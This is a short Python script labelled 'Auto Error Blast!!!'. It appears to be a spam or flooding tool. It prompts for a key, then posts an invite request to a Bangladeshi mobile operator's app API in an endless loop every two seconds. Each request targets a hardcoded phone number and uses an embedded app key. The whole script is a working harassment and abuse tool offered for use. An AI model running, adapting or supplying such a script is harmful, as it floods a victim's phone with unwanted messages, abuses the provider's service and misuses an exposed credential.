import requests, time
print("Auto Error Blast!!!")
Key = input("Enter Lkey: ")
while 1:
      url2 = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=sendContactList&action=invite'
      myobj0 = {'data':'[{ "msisdn": "8801819400400" }]'}
      try:
        x=requests.post(url2, data = myobj0, headers = {"x-api-key": Key,"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})      
        print(x.text)
        time.sleep(2)
      except:       
        print("Server Error")
